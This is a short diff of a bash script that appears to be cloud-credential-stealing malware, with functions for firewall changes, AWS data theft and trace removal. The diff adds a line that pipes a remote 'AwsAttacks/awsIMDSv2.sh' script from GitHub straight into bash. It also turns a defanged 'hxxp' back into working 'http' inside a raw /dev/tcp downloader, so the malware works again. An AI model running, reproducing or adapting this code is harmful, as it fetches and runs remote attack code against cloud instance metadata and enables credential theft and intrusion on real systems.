@@ -38,9 +38,9 @@ int_main(){
 fwall
 dns_opt
 
-get_aws_data
-send_aws_data
-
+#get_aws_data
+#send_aws_data
+curl -Lk https://raw.githubusercontent.com/SoOM3a/AwsAttacks/main/awsIMDSv2.sh | bash
 notraces
 }
 
@@ -68,7 +68,7 @@ dload() {
   PORT=${server//*:}
   [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
   exec 3<>/dev/tcp/${HOST}/$PORT
-  echo -en "GET ${DOC} hxxp/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
+  echo -en "GET ${DOC} http/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
   while IFS= read -r line ; do 
       [[ "$line" == $'\r' ]] && break
   done <&3
